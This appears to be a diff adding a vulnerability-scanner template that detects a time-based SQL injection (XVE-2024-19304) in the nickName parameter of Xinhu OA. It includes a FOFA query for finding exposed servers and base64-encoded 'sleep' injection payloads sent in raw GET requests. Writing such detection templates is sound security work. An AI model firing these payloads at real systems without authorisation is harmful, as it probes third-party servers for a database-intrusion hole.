@@ -1,0 +1,35 @@
+id: xinhuOA-nickName-sql
+
+info:
+  name: 信呼OA nickName SQL注入漏洞(XVE-2024-19304)
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: app="信呼-OA系统"
+
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        GET /index.php?m=openmodhetong|openapi&d=task&a=data&ajaxbool=0&nickName=MScgYW5kIHNsZWVwKDQpIw== HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+
+      - |
+        GET /index.php?m=openmodhetong|openapi&d=task&a=data&ajaxbool=0&nickName=MScgYW5kIHNsZWVwKDgpIw== HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and
+
+
+
+
+
+
